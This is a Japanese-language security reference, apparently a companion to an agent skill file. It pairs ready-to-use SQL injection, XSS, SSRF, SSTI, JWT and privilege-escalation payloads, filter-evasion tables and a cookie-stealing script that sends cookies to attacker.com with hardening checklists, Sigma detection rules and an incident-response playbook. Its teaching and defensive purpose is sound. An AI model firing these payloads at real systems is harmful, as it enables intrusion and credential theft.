# Security Arsenal — Reference

SKILL.md 補足: ペイロード集、フィルター回避、チェックリスト、IR プレイブック、CTF テクニック。概要・判断フローは [SKILL.md](SKILL.md) を参照。

## 目次

1. [Web 攻撃ペイロード集](#web-攻撃ペイロード集)
2. [API-Specific Attacks](#api-specific-attacks)
3. [クラウドセキュリティ](#クラウドセキュリティ)
4. [フィルター回避テクニック](#フィルター回避テクニック)
5. [認証攻撃の詳細](#認証攻撃の詳細)
6. [権限昇格チートシート](#権限昇格チートシート)
7. [ハードニングチェックリスト](#ハードニングチェックリスト)
8. [検知ルール集](#検知ルール集)
9. [IR プレイブック](#ir-プレイブック)
10. [CTF テクニック集](#ctf-テクニック集)
11. [ツールリファレンス](#ツールリファレンス)
12. [OWASP Top 10 攻防マッピング](#owasp-top-10-攻防マッピング)

---

## Web 攻撃ペイロード集

### SQL Injection

**Union-based**（カラム数を特定してからデータ抽出）:
```sql
' ORDER BY 5--                              -- カラム数特定
' UNION SELECT 1,2,3,4,5--                  -- 表示位置確認
' UNION SELECT 1,username,password,4,5 FROM users--  -- データ抽出
```

**Error-based**（エラーメッセージにデータを埋め込む）:
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--  -- MSSQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))--     -- MySQL
```

**Blind（Boolean）**:
```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT LENGTH(password) FROM users WHERE id=1)>10--
```

**Blind（Time-based）**:
```sql
' AND IF(1=1,SLEEP(5),0)--                  -- MySQL
'; WAITFOR DELAY '0:0:5'--                  -- MSSQL
' AND pg_sleep(5)--                         -- PostgreSQL
```

**Second Order**: 入力時はエスケープされるが、DB 保存後に別クエリで使われる時に発火。ユーザー名に `admin'--` を登録 → パスワードリセット時に注入。

### XSS

**基本**:
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

**Cookie 窃取**:
```html
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
```

**DOM XSS の sink/source**:
```
Source: location.hash, document.referrer, window.name
Sink: innerHTML, document.write, eval, setTimeout
```

### SSRF

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS IMDSv1
http://metadata.google.internal/computeMetadata/v1/                # GCP（要 Metadata-Flavor: Google）
http://169.254.169.254/metadata/instance?api-version=2021-02-01    # Azure（要 Metadata: true）
# AWS IMDSv2（トークン必須）: PUT /latest/api/token → X-aws-ec2-metadata-token ヘッダー付きで取得
file:///etc/passwd                                                  # ローカルファイル
gopher://internal-service:6379/_*1%0d%0a$8%0d%0aSHUTDOWN%0d%0a    # Redis
```

### SSTI（Server-Side Template Injection）

```
{{7*7}}           → 49 なら Jinja2/Twig
${7*7}            → 49 なら FreeMarker/EL
#{7*7}            → 49 なら Thymeleaf
<%= 7*7 %>        → 49 なら ERB
```

**Jinja2 RCE**:
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## API-Specific Attacks

### GraphQL

```graphql
# イントロスペクション（スキーマ全取得）
{ __schema { types { name fields { name type { name } } } } }

# バッチクエリ DoS
[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"},...] # 大量バッチ

# ネストクエリ深度攻撃
{ user { friends { friends { friends { friends { name } } } } } }
```

**防御**: イントロスペクション無効化（本番）、クエリ深度制限（max 5-7）、クエリコスト分析

### Mass Assignment

```json
// POST /api/users — 通常のリクエスト
{"name": "test", "email": "test@example.com"}

// 攻撃: 非公開フィールドを追加
{"name": "test", "email": "test@example.com", "role": "admin", "is_verified": true}
```

**防御**: allowlist でバインド可能フィールドを明示（Zod スキーマ等）

---

## クラウドセキュリティ

### IAM ミスコンフィグ

```bash
# AWS: 過剰権限の確認
aws iam list-attached-user-policies --user-name target-user
aws iam get-policy-version --policy-arn <arn> --version-id v1

# よくある問題
# - AdministratorAccess が開発者に付与
# - AssumeRole の信頼ポリシーが * になっている
# - アクセスキーのローテーションなし（90日超過）
```

### ストレージ公開設定

```bash
# S3 パブリックバケット
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/secret.txt . --no-sign-request

# GCS パブリック
curl https://storage.googleapis.com/target-bucket/
```

**防御**: S3 Block Public Access 有効化、バケットポリシー監査、CloudTrail データイベント有効化

### サーバーレス攻撃

- **Lambda インジェクション**: 環境変数に機密情報 → `process.env` 経由で漏洩
- **イベントインジェクション**: API Gateway 経由のパラメータがサニタイズされずに Lambda に渡される
- **過剰権限**: Lambda 実行ロールに `*:*` 権限

### コンテナ / Kubernetes

```bash
# 特権コンテナ検出
kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'

# RBAC 過剰権限チェック
kubectl auth can-i --list --as=system:serviceaccount:default:default

# イメージ脆弱性スキャン
trivy image myapp:latest --severity HIGH,CRITICAL
```

- **コンテナエスケープ**: 特権コンテナ、hostPID/hostNetwork、Docker ソケットマウント
- **Pod Security Standards**: Restricted プロファイル適用で特権操作を制限
- **Network Policy**: デフォルト deny + 必要通信のみ allow
- **イメージセキュリティ**: trivy/grype でベースイメージの CVE スキャン、署名検証

---

## フィルター回避テクニック

### SQLi 回避

| フィルター | 回避方法 |
|-----------|---------|
| スペースブロック | `/**/`, `%09`, `%0a` で代替 |
| UNION ブロック | `UnIoN`, `UN/**/ION`, ダブルエンコード |
| 引用符ブロック | 数値型なら引用符不要、`CHAR()` 関数 |
| コメントブロック | `#`, `--`, `;%00` |
| WAF 全般 | チャンク転送エンコーディング、JSON パラメータ |

### XSS 回避

| フィルター | 回避方法 |
|-----------|---------|
| `<script>` ブロック | `<img>`, `<svg>`, `<body>` タグ利用 |
| `alert` ブロック | `confirm()`, `prompt()`, `eval(atob('...'))` |
| `on` イベントブロック | `<svg><animate onbegin=alert(1)>` |
| 大文字/小文字 | `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` |
| HTML エンコード | ダブルエンコード、Unicode エスケープ |

---

## 認証攻撃の詳細

### JWT 攻撃

**alg:none 攻撃**:
```python
# ヘッダーを {"alg":"none","typ":"JWT"} に変更
# 署名部分を空にして送信
header = base64url('{"alg":"none","typ":"JWT"}')
payload = base64url('{"sub":"admin","role":"admin"}')
token = f"{header}.{payload}."
```

**弱い署名鍵**:
```bash
# 辞書攻撃で署名鍵を特定
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

**kid インジェクション**:
```json
{"alg":"HS256","kid":"../../dev/null"}
// 鍵ファイルパスを操作、空ファイルで署名検証を突破
```

### OAuth フロー攻撃

- **redirect_uri 操作**: `redirect_uri=https://attacker.com/callback` で認可コード窃取
- **state 欠落**: CSRF でユーザーを攻撃者の認可フローに誘導
- **scope 昇格**: 初回は最小 scope → トークンリフレッシュ時に scope 追加

### パスワードリセット poisoning

```http
POST /reset-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```
→ リセットリンクが `https://attacker.com/reset?token=...` になる

---

## 権限昇格チートシート

### Linux

```bash
# 情報収集
id && whoami && hostname
uname -a                    # カーネルバージョン
cat /etc/os-release         # OS バージョン
env                         # 環境変数（認証情報が含まれることも）

# SUID/SGID
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
# → GTFOBins (https://gtfobins.github.io/) で悪用方法確認

# sudo
sudo -l                     # 実行可能コマンド確認

# Cron
cat /etc/crontab
ls -la /etc/cron.*
# → ワイルドカードインジェクション or 書き込み可能スクリプト

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Capabilities
getcap -r / 2>/dev/null
# → python3 に cap_setuid+ep があれば root 昇格可能

# Docker 所属
id | grep docker            # docker グループなら root 相当
```

### Windows

```powershell
# 情報収集
whoami /priv                # 権限確認
systeminfo                  # パッチ情報
net user                    # ユーザー一覧

# サービス設定ミス
sc qc ServiceName           # サービスのバイナリパス確認
icacls "C:\path\to\service.exe"  # 書き込み権限確認

# Token Impersonation（SeImpersonatePrivilege がある場合）
# → JuicyPotato / PrintSpoofer / GodPotato

# AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# → 1 なら msiexec でSYSTEM権限取得
```

---

## ハードニングチェックリスト

### サーバー OS

- [ ] SSH: パスワード認証無効、鍵認証のみ
- [ ] SSH: root ログイン禁止（`PermitRootLogin no`）
- [ ] SSH: デフォルトポート変更（22 以外）
- [ ] ファイアウォール: デフォルト deny、必要ポートのみ allow
- [ ] 不要サービス無効化（`systemctl disable`）
- [ ] 自動パッチ適用（`unattended-upgrades`）
- [ ] fail2ban / rate limiting 設定
- [ ] ファイル整合性監視（AIDE / OSSEC）
- [ ] ログの外部転送（SIEM 連携）
- [ ] SELinux / AppArmor 有効化

### Web アプリケーション

- [ ] CSP ヘッダー設定（`default-src 'self'` 以上）
- [ ] HSTS 有効化（`max-age=31536000; includeSubDomains`）
- [ ] X-Frame-Options: DENY or SAMEORIGIN
- [ ] X-Content-Type-Options: nosniff
- [ ] CORS: 許可ドメイン最小限（`*` 禁止）
- [ ] Cookie: Secure + HttpOnly + SameSite=Lax 以上
- [ ] 認証 EP にレートリミット（アプリ特性に応じて設定）
- [ ] CSRF トークン実装
- [ ] 入力バリデーション（サーバーサイド必須）
- [ ] エラーメッセージにスタックトレースを含めない

### データベース

- [ ] Prepared Statements / パラメータ化クエリ
- [ ] 最小権限の DB ユーザー（DROP/ALTER 権限なし）
- [ ] TLS 接続必須
- [ ] デフォルト認証情報の変更
- [ ] 外部からの直接アクセス禁止（ローカルバインド）
- [ ] 定期バックアップ + リストアテスト

---

## 検知ルール集

### Sigma ルール形式のアラート

```yaml
# Brute Force Detection（Windows）
title: Multiple Failed Login Attempts (Windows)
detection:
  selection:
    EventID: 4625
  condition: selection | count(SourceIP) > 10 within 5m
level: high

# Brute Force Detection（Linux）
title: Multiple Failed Login Attempts (Linux)
detection:
  selection:
    log_source: /var/log/auth.log
    message|contains: "Failed password"
  condition: selection | count(src_ip) > 10 within 5m
level: high

# SQL Injection in Logs
title: SQL Injection Attempt in Web Logs
detection:
  selection:
    request_uri|contains:
      - "UNION SELECT"
      - "OR 1=1"
      - "'; DROP"
      - "SLEEP("
  condition: selection
level: critical

# SSRF Internal IP Access
title: Request to Internal IP Range
detection:
  selection:
    dest_ip|startswith:
      - "10."
      - "172.16."
      - "169.254."
      - "127."
  condition: selection
level: critical

# Web Shell Detection
title: Web Server Spawning Shell Process
detection:
  selection:
    parent_image|endswith:
      - "/apache2"
      - "/nginx"
      - "/httpd"
      - "/node"
    image|endswith:
      - "/bash"
      - "/sh"
      - "/cmd.exe"
  condition: selection
level: critical
```

### 異常検知の指標

| 指標 | 正常範囲（目安） | 異常（要調査） |
|------|---------|------|
| ログイン失敗率 | < 5%/時間 | > 20%（brute force） |
| 404 レート | < 1%/時間 | > 10%（ディレクトリ列挙） |
| リクエストサイズ | < 10KB | > 1MB（exfiltration） |
| DNS クエリ長 | < 50文字 | > 100文字（DNS トンネル） |
| 夜間アクセス | ほぼゼロ | 急増（不正アクセス） |

---

## IR プレイブック

### Phase 1: 初動（最初の1時間）

```
1. [ ] 証拠保全: メモリダンプ → ディスクイメージ（順序重要）
2. [ ] 揮発性データ: netstat, ps, who, last, /proc/
3. [ ] タイムライン開始: 最初の異常イベントの時刻特定
4. [ ] スコープ初期推定: 影響範囲の仮説を立てる
5. [ ] 経営層へ初期報告: 「何が」「いつ」「推定影響」
6. [ ] 外部連絡判断: 法執行機関・CSIRT への連絡要否
```

### Phase 2: 封じ込め判断マトリクス

| 状況 | 封じ込め策 | リスク |
|------|-----------|--------|
| 単一ホスト感染 | ネットワーク隔離 | サービス中断 |
| ランサムウェア拡散中 | 全ネットワークセグメント隔離 | 全サービス停止 |
| 認証情報漏洩 | 全アカウントパスワードリセット | ユーザー影響大 |
| Webシェル発見 | 該当サーバー隔離 + WAF ルール追加 | 部分サービス中断 |
| DNS ハイジャック | DNS 設定を手動修正 + TTL 短縮 | 伝播に時間 |

### Phase 3: 復旧チェックリスト

- [ ] マルウェア・バックドアの完全除去確認
- [ ] 全認証情報のリセット（パスワード、API キー、トークン）
- [ ] 影響を受けたシステムのクリーン再構築（パッチ済み OS）
- [ ] セキュリティ設定の見直し（侵入経路を塞ぐ）
- [ ] 段階的サービス復旧（監視強化しながら）
- [ ] ユーザーへの通知（個人情報漏洩の場合は法的義務）

### Phase 4: 事後分析テンプレート

```markdown
## インシデント事後分析

### 概要
- 発生日時:
- 検知日時:
- 影響範囲:
- 攻撃手法:

### タイムライン
| 時刻 | イベント |
|------|---------|
| | |

### 根本原因
### うまくいったこと
### 改善が必要なこと
### アクションアイテム
| 対策 | 担当 | 期限 |
|------|------|------|
| | | |
```

---

## CTF テクニック集

### Web 問題の定石

1. **ソースコード確認**: HTML コメント、JS ファイル、robots.txt、.git/
2. **Cookie / ヘッダー操作**: `isAdmin=true`, `role=admin` の直接書き換え
3. **パラメータ改ざん**: 負の値、巨大な値、型の不一致（文字列→配列）
4. **ファイルアップロード**: 拡張子バイパス（`.php.jpg`, `.pHp`）、Content-Type 偽装
5. **Path Traversal**: `../../../etc/passwd`, NULL バイト `%00`
6. **デシリアライゼーション**: PHP(`unserialize`)、Python(`pickle`)、Java

### Crypto 問題の定石

1. **弱い乱数**: 時刻ベースの seed → 予測可能
2. **ECB モード**: ブロック入れ替えで暗号文操作
3. **Padding Oracle**: パディングエラーから平文復元
4. **RSA**: 小さい e + 短い平文 → e乗根攻撃、共通 n → GCD

### Forensics の定石

1. **ファイルカービング**: `binwalk`, `foremost` で埋め込みファイル抽出
2. **ステガノグラフィ**: `steghide`, `zsteg`, LSB 解析
3. **メモリ**: Volatility でプロセス一覧、ネットワーク接続、キャッシュ
4. **パケット**: Wireshark で HTTP/DNS 通信を解析、Follow TCP Stream

### Rev/Pwn の基本

1. **逆アセンブル**: Ghidra / IDA Free でバイナリ解析
2. **デバッグ**: GDB + pwndbg/peda でブレークポイント設定
3. **BOF**: スタックオーバーフロー → RIP 制御 → ROP チェーン / ret2libc
4. **Format String**: `%x` でスタック読み取り、`%n` で書き込み

---

## ツールリファレンス

### 偵察

| ツール | 用途 |
|--------|------|
| nmap | ポートスキャン・サービス検出 |
| subfinder / amass | サブドメイン列挙 |
| httpx | HTTP プローブ（ステータス・タイトル取得） |
| feroxbuster / gobuster | ディレクトリ・ファイル列挙 |
| nuclei | テンプレートベースの脆弱性スキャン |

### Web テスト

| ツール | 用途 |
|--------|------|
| Burp Suite | プロキシ・スキャナー・リピーター |
| sqlmap | SQL Injection 自動化 |
| XSStrike | XSS 検出・回避 |
| ffuf | ファジング（パラメータ・パス） |
| Postman / curl | API テスト |

### エクスプロイト

| ツール | 用途 |
|--------|------|
| Metasploit | エクスプロイトフレームワーク |
| searchsploit | exploit-db のローカル検索 |
| pwntools | CTF 用 Python エクスプロイトライブラリ |
| CyberChef | エンコード・デコード・暗号操作 |

### 防御・検知

| ツール | 用途 |
|--------|------|
| ModSecurity | WAF（OWASP CRS） |
| Wazuh | SIEM + EDR（OSS） |
| AIDE | ファイル整合性監視 |
| fail2ban | ブルートフォース防止 |
| Suricata | ネットワーク IDS/IPS |

---

## OWASP Top 10 攻防マッピング

| # | 脆弱性 | 攻撃（Red） | 防御（Blue） |
|---|--------|-----------|------------|
| A01 | Broken Access Control | IDOR、権限昇格、パス操作 | RBAC 徹底、サーバーサイド検証、デフォルト deny |
| A02 | Cryptographic Failures | 弱い暗号、平文通信、ハードコード鍵 | TLS 必須、強い暗号アルゴリズム、鍵管理 |
| A03 | Injection | SQLi、XSS、SSTI、OS コマンド | Prepared Statements、CSP、入力検証 |
| A04 | Insecure Design | ビジネスロジック欠陥 | 脅威モデリング、セキュアデザインパターン |
| A05 | Security Misconfiguration | デフォルト認証情報、不要機能 | ハードニング、最小構成、定期監査 |
| A06 | Vulnerable Components | 既知 CVE の悪用 | 依存関係スキャン、自動パッチ |
| A07 | Auth Failures | Brute force、セッション固定 | MFA、レートリミット、セッション管理 |
| A08 | Data Integrity Failures | CI/CD 汚染、デシリアライズ | 署名検証、SBOM、整合性チェック |
| A09 | Logging Failures | ログ不足で検知不能 | 包括的ログ、SIEM 連携、アラート |
| A10 | SSRF | 内部リソースアクセス | 許可リスト、IMDSv2、ネットワーク分離 |
